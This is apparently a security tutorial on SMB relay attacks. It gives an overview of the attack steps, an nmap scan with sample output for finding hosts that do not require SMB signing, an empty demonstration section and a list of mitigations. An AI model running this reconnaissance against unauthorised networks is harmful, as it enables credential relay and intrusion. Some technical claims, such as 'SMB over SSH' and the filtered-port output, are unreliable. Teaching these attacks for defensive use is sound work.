### Overview
An SMB (Server Message Block) relay attack is a type of network attack that exploits the authentication process in the SMB protocol. SMB is a network file-sharing protocol commonly used in Windows environments for accessing shared resources like files, printers, and other devices.

In a typical SMB relay attack, the attacker intercepts or captures SMB traffic between a client and a server and then relays that captured traffic to another target server on the network. The attacker essentially acts as a "man-in-the-middle" (MITM), forwarding the authentication request from the victim to the target server and vice versa.

1. The attacker sets up a rogue SMB server or uses existing systems on the network that can respond to SMB requests.
2. The attacker identifies SMB negotiation requests from potential victims. These requests usually happen when a client tries to access a network resource like a file share.
3. The attacker intercepts the negotiation requests and responds to the client on behalf of the actual server, pretending to be the target server.
4. The client sends its authentication credentials (e.g., username and password) to the attacker, believing it is communicating with the legitimate server.
5. The attacker, now in possession of the victim's authentication details, relays these credentials to the actual target server on the network.
6. If successful, the attacker gains unauthorized access to the target server using the victim's credentials.

The SMB relay attack can be very effective when the target server does not require packet signing or when SMB signing is poorly implemented. Packet signing is a security feature designed to prevent tampering with SMB traffic, but if it's not enabled or misconfigured, the attack becomes easier to execute.

The impact of an SMB relay attack can be severe, as it allows the attacker to gain unauthorized access to sensitive resources on the target server using legitimate user credentials. To defend against SMB relay attacks, network administrators should enforce SMB signing and use other security measures like IPsec, VPNs, or SMB over SSH to secure communications. Additionally, regularly patching and updating systems can help mitigate potential vulnerabilities.

### Host Discovery (SMB Signing Disabled)
**Note:** Make Sure that the network discovery is opened on the windows victim machine

Discovering hosts with SMB signing disabled can be achieved through various network scanning and enumeration techniques. Keep in mind that any network scanning activities should be conducted responsibly and only on systems that you own or have explicit permission to test. Here are some methods to identify hosts with SMB signing disabled:

1. **Port Scanning**: Use a network scanning tool like Nmap to scan the target network for open ports, including port 445 (the default SMB port). The presence of open port 445 indicates that SMB is likely active on the host.
2. **SMB Enumeration**: Once you identify a host with port 445 open, you can use SMB enumeration tools like Enum4linux, smbclient, or Metasploit's smb_enumusers module to gather information about the SMB shares and users on the target system.
3. **SMB Signing Detection Tools**: Some tools specifically target the detection of SMB signing status on hosts. For example, "impacket" is a popular Python library that includes the "smbclient" tool, which can be used to detect whether SMB signing is enabled or disabled on a target system.
4. **SMB Relay Attacks**: You can attempt to carry out an SMB relay attack as described earlier. During the attack, if you are successful in relaying the SMB authentication request to another system, it may indicate that SMB signing is disabled on the target system.
5. **Security Assessment Tools**: Commercial and open-source security assessment tools often include checks for SMB signing status as part of their vulnerability scanning capabilities.
6. **Active Directory Auditing**: In Windows environments with Active Directory, you can audit the Group Policy settings related to SMB signing. Group Policy can enforce SMB signing requirements on domain controllers and clients.

#### Attack Vector
```bash
$ nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24

Nmap Scan report for 192.168.57.x
Host is up (0.000064s latency).

PORT      STATE     SERVICE
445/tcp   filtered  microsoft-ds
MAC Address: <xx:xx:xx:xx:xx:xx> (VMware)

Host script results:
| smb2-security-mode
|  2.02:
|   Message siging enabled but not required
```
 This message `Message siging enabled but not required` means that the machine is vulnerable to SMB Relay Attack in case of that the machine isn't the server (Domain Controller)

### Full Attack Demonstration

### Mitigation
Mitigating against SMB relay attacks involves implementing various security measures to strengthen the authentication and communication processes within the SMB protocol. Here are some effective mitigation strategies:

1. **Enable SMB Signing**: Enforce SMB packet signing to prevent tampering and ensure the integrity of SMB communications. This can be done through Group Policy settings in Windows environments. When SMB signing is enabled, the client and server sign all SMB packets exchanged during the communication, making it harder for attackers to tamper with or relay the traffic.
2. **Require Extended Protection for Authentication**: Extended Protection for Authentication is a security feature in Windows that helps prevent SMB relay attacks. By enabling this feature, clients are required to provide channel bindings when authenticating to a server, making it more challenging for attackers to intercept and relay authentication requests.
3. **Disable SMBv1**: SMB version 1 (SMBv1) is an outdated and vulnerable version of the protocol. Disabling SMBv1 on both clients and servers is recommended to mitigate various SMB-related attacks, including relay attacks. SMBv2 and later versions have improved security features and should be used instead.
4. **Implement IPsec**: IPsec (Internet Protocol Security) can be used to secure SMB communications by encrypting and authenticating network traffic between hosts. By implementing IPsec, even if an attacker captures SMB traffic, they won't be able to decipher the content.
5. **Network Segmentation**: Divide your network into segments or VLANs and control traffic flow between them using firewalls and access control lists. By limiting SMB traffic to specific trusted segments, you can reduce the attack surface and contain potential SMB relay attempts.
6. **Use VPNs**: Encourage the use of VPNs (Virtual Private Networks) for remote access. VPNs provide an additional layer of security, encrypting the entire communication channel and making it more difficult for attackers to intercept and manipulate SMB traffic.
7. **Regular Patching and Updates**: Keep all systems, including servers and clients, up to date with the latest security patches and updates. Vulnerabilities in SMB or related components can be patched to reduce the risk of exploitation.
8. **Network Monitoring and Intrusion Detection**: Implement robust network monitoring and intrusion detection systems to identify suspicious activity, such as failed authentication attempts or unusual SMB traffic patterns.
9. **Strong Authentication Policies**: Enforce strong password policies and consider implementing multi-factor authentication (MFA) to make it harder for attackers to obtain valid credentials.
10. **Penetration Testing and Security Audits**: Regularly conduct penetration testing and security audits to identify and address potential weaknesses and vulnerabilities in the network and systems.
